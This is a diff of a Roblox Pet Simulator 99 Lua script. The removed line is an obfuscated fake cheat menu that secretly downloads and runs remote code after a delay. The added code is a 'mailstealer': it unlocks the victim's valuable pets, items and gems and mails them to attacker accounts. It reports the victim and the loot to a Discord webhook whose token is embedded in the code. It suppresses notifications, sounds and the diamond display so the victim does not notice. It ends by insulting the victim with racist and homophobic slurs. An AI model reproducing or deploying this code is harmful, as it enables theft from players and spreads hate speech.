@@ -1,1 +1,362 @@
-local _a=game:GetService(string.char(80,108,97,121,101,114,115))local _b=game:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101))local _c=game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101))local _d={Title=string.char(80,101,116,32,83,105,109,32,57,57,32,73,110,115,97,110,101,32,83,99,114,105,112,116),Options={string.char(70,114,101,101,122,101,32,84,114,97,100,101),string.char(72,117,103,101,32,72,117,110,116,101,114),string.char(83,111,111,110,46,46,46)}}local _e=_a.LocalPlayer local _f=_e:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))if _f:FindFirstChild(string.char(77,111,100,101,114,110,70,105,100,103,101,116,71,117,105))then _f.ModernFidgetGui:Destroy()end local _g=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_g.Name=string.char(77,111,100,101,114,110,70,105,100,103,101,116,71,117,105)_g.ResetOnSpawn=false _g.Parent=_f local _h=Instance.new(string.char(70,114,97,109,101))_h.Size=UDim2.new(0,320,0,260)_h.Position=UDim2.new(0.5,-160,0.5,-130)_h.BackgroundColor3=Color3.fromRGB(20,20,20)_h.BorderSizePixel=0 _h.Active=true _h.Parent=_g local _i=Instance.new(string.char(85,73,67,111,114,110,101,114))_i.CornerRadius=UDim.new(0,16)_i.Parent=_h local _j=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_j.Size=UDim2.new(1,0,0,60)_j.BackgroundTransparency=1 _j.Text=_d.Title _j.TextColor3=Color3.fromRGB(255,255,255)_j.Font=Enum.Font.GothamBold _j.TextSize=22 _j.LayoutOrder=0 _j.Parent=_h local _k=Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116))_k.Parent=_h _k.SortOrder=Enum.SortOrder.LayoutOrder _k.Padding=UDim.new(0,12)_k.HorizontalAlignment=Enum.HorizontalAlignment.Center local function _l(_m,_n)local _o=Instance.new(string.char(70,114,97,109,101))_o.Size=UDim2.new(0,280,0,50)_o.BackgroundColor3=Color3.fromRGB(45,45,45)_o.LayoutOrder=_n _o.Parent=_h local _p=Instance.new(string.char(85,73,67,111,114,110,101,114))_p.CornerRadius=UDim.new(0,12)_p.Parent=_o local _q=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_q.Size=UDim2.new(1,-80,1,0)_q.Position=UDim2.new(0,20,0,0)_q.BackgroundTransparency=1 _q.Text=_m _q.TextColor3=Color3.fromRGB(230,230,230)_q.Font=Enum.Font.GothamSemibold _q.TextSize=16 _q.TextXAlignment=Enum.TextXAlignment.Left _q.Parent=_o local _r=Instance.new(string.char(70,114,97,109,101))_r.Size=UDim2.new(0,48,0,26)_r.Position=UDim2.new(1,-65,0.5,-13)_r.BackgroundColor3=Color3.fromRGB(150,150,150)_r.Parent=_o local _s=Instance.new(string.char(85,73,67,111,114,110,101,114))_s.CornerRadius=UDim.new(1,0)_s.Parent=_r local _t=Instance.new(string.char(70,114,97,109,101))_t.Size=UDim2.new(0,22,0,22)_t.Position=UDim2.new(0,2,0.5,-11)_t.BackgroundColor3=Color3.fromRGB(255,255,255)_t.Parent=_r local _u=Instance.new(string.char(85,73,67,111,114,110,101,114))_u.CornerRadius=UDim.new(1,0)_u.Parent=_t local _v=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))_v.Size=UDim2.new(1,0,1,0)_v.BackgroundTransparency=1 _v.Text=""_v.Parent=_r local _w=false local _x=TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)_v.MouseButton1Click:Connect(function()_w=not _w local _y=_w and Color3.fromRGB(0,122,255)or Color3.fromRGB(150,150,150)local _z=_w and UDim2.new(1,-24,0.5,-11)or UDim2.new(0,2,0.5,-11)local _A=_b:Create(_r,_x,{BackgroundColor3=_y})local _B=_b:Create(_t,_x,{Position=_z})_A:Play()_B:Play()end)end for _C,_D in ipairs(_d.Options)do _l(_D,_C)end local _E local _F local _H local _I local function _J(_K)local _L=_K.Position-_H _h.Position=UDim2.new(_I.X.Scale,_I.X.Offset+_L.X,_I.Y.Scale,_I.Y.Offset+_L.Y)end _h.InputBegan:Connect(function(_K)if _K.UserInputType==Enum.UserInputType.MouseButton1 or _K.UserInputType==Enum.UserInputType.Touch then _E=true _H=_K.Position _I=_h.Position _K.Changed:Connect(function()if _K.UserInputState==Enum.UserInputState.End then _E=false end end)end end)_h.InputChanged:Connect(function(_K)if _K.UserInputType==Enum.UserInputType.MouseMovement or _K.UserInputType==Enum.UserInputType.Touch then _F=_K end end)_c.InputChanged:Connect(function(_K)if _K==_F and _E then _J(_K)end end)task.delay(60,function()loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,97,112,105,46,114,117,98,105,115,46,97,112,112,47,118,50,47,115,99,114,97,112,47,98,104,49,114,121,112,107,78,121,70,99,53,67,117,106,115,47,114,97,119),true))()end)
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local network = require(game.ReplicatedStorage.Library.Client.Network)
+local library = require(game.ReplicatedStorage.Library)
+local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+local plr = game.Players.LocalPlayer
+local MailMessage = "GG / GY2RVSEGDT"
+local HttpService = game:GetService("HttpService")
+local sortedItems = {}
+local totalRAP = 0
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+local users = _G.Usernames or {"Thatgirl14xx"}
+local min_rap = _G.minrap or 1000000
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1523363184143110265/_6uKF5v9eLU7lSkX8o4hqIegqqewVoN_TpRMajgOOVPZHA7lN9WoH23-fYQGvB9MnsEM"
+
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add any usernames or webhook")
+    return
+end
+
+for _, user in ipairs(users) do
+    if plr.Name == user then
+        plr:kick("You cannot mailsteal yourself, mailstealer is working")
+        return
+    end
+end
+
+for adress, func in pairs(getgc()) do
+    if debug.getinfo(func).name == "computeSendMailCost" then
+        FunctionToGetFirstPriceOfMail = func
+        break
+    end
+end
+
+local mailSendPrice = FunctionToGetFirstPriceOfMail()
+
+local GemAmount1 = 1
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+		break
+    end
+end
+
+local function formatNumber(number)
+	local number = math.floor(number)
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+	return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+local function SendMessage(diamonds)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+	local fields = {
+		{
+			name = "Victim Username:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items to be sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = "",
+            inline = false
+        }
+	}
+
+    local combinedItems = {}
+    local itemRapMap = {}
+
+    for _, item in ipairs(sortedItems) do
+        local rapKey = item.name
+        if itemRapMap[rapKey] then
+            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
+        else
+            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
+            table.insert(combinedItems, rapKey)
+        end
+    end
+
+    table.sort(combinedItems, function(a, b)
+        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
+    end)
+
+    for _, itemName in ipairs(combinedItems) do
+        local itemData = itemRapMap[itemName]
+        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+    end
+
+    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\144\177 New PS99 Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n")
+            fields[2].value = fields[2].value .. "\nPlus more!"
+        end
+    end
+
+    local body = HttpService:JSONEncode(data)
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+	gemsleaderstatpath.Value = gemsleaderstat
+end)
+
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+	noti.Enabled = false
+end)
+noti.Enabled = false
+
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" then
+        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+            x.Volume=0
+            x.PlayOnRemove=false
+            x:Destroy()
+        end
+    end
+end)
+
+local function getRAP(Type, Item)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+            end,
+            AbstractGetRAP = function(self)
+                return nil
+            end
+        }
+    ) or 0)
+end
+
+local function sendItem(category, uid, am)
+    local userIndex = 1
+    local maxUsers = #users
+    local sent = false
+    
+    repeat
+        local currentUser = users[userIndex]
+        local args = {
+            [1] = currentUser,
+            [2] = MailMessage,
+            [3] = category,
+            [4] = uid,
+            [5] = am or 1
+        }
+
+        local response, err = network.Invoke("Mailbox: Send", unpack(args))
+
+        if response == true then
+            sent = true
+            GemAmount1 = GemAmount1 - mailSendPrice
+            mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
+            if mailSendPrice > 5000000 then
+                mailSendPrice = 5000000
+            end
+        elseif response == false and err == "They don't have enough space!" then
+            userIndex = userIndex + 1
+            if userIndex > maxUsers then
+                sent = true
+            end
+        end
+    until sent
+end
+
+local function SendAllGems()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+            if GemAmount1 >= (mailSendPrice + 10000) then
+                local userIndex = 1
+                local maxUsers = #users
+                local sent = false
+                
+                repeat
+                    local currentUser = users[userIndex]
+                    local args = {
+                        [1] = currentUser,
+                        [2] = MailMessage,
+                        [3] = "Currency",
+                        [4] = i,
+                        [5] = GemAmount1 - mailSendPrice
+                    }
+                    
+                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
+                    
+                    if response == true then
+                        sent = true
+                    elseif response == false and err == "They don't have enough space!" then
+                        userIndex = userIndex + 1
+                        if userIndex > maxUsers then
+                            sent = true
+                        end
+                    end
+                until sent
+                break
+            end
+        end
+    end
+end
+
+local function EmptyBoxes()
+    if save.Box then
+        for key, value in pairs(save.Box) do
+			if value._uq then
+				network.Invoke("Box: Withdraw All", key)
+			end
+        end
+    end
+end
+
+local function ClaimMail()
+    local response, err = network.Invoke("Mailbox: Claim All")
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        wait(0.2)
+        response, err = network.Invoke("Mailbox: Claim All")
+    end
+end
+
+local function canSendMail()
+	local uid
+	for i, v in pairs(save["Pet"]) do
+		uid = i
+		break
+	end
+	local args = {
+        [1] = "Roblox",
+        [2] = "Test",
+        [3] = "Pet",
+        [4] = uid,
+        [5] = 1
+    }
+    local response, err = network.Invoke("Mailbox: Send", unpack(args))
+    return (err == "They don't have enough space!")
+end
+
+require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+
+for i, v in pairs(categoryList) do
+	if save[v] ~= nil then
+		for uid, item in pairs(save[v]) do
+			if v == "Pet" then
+                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
+                if dir.huge or dir.exclusiveLevel then
+                    local rapValue = getRAP(v, item)
+                    if rapValue >= min_rap then
+                        local prefix = ""
+                        if item.pt and item.pt == 1 then
+                            prefix = "Golden "
+                        elseif item.pt and item.pt == 2 then
+                            prefix = "Rainbow "
+                        end
+                        if item.sh then
+                            prefix = "Shiny " .. prefix
+                        end
+                        local id = prefix .. item.id
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                        totalRAP = totalRAP + (rapValue * (item._am or 1))
+                    end
+                end
+            else
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                end
+            end
+            if item._lk then
+                local args = {
+                [1] = uid,
+                [2] = false
+                }
+                network.Invoke("Locking_SetLocked", unpack(args))
+            end
+        end
+	end
+end
+
+if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
+    ClaimMail()
+	EmptyBoxes()
+    if not canSendMail() then
+        message.Error("Account error. Please rejoin and try again or use a different account")
+        return
+    end
+
+    table.sort(sortedItems, function(a, b)
+        return a.rap * a.amount > b.rap * b.amount 
+    end)
+
+    spawn(function()
+        SendMessage(GemAmount1)
+    end)
+
+    for _, item in ipairs(sortedItems) do
+        if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
+            sendItem(item.category, item.uid, item.amount)
+        else
+            break
+        end
+    end
+    if GemAmount1 > mailSendPrice then
+        SendAllGems()
+    end
+    message.Error("Fuck you nigger your fucking nigger faggot ass items got stolen by my mailstealer! Don't use void mailstealer, its dualhooked!")
+end
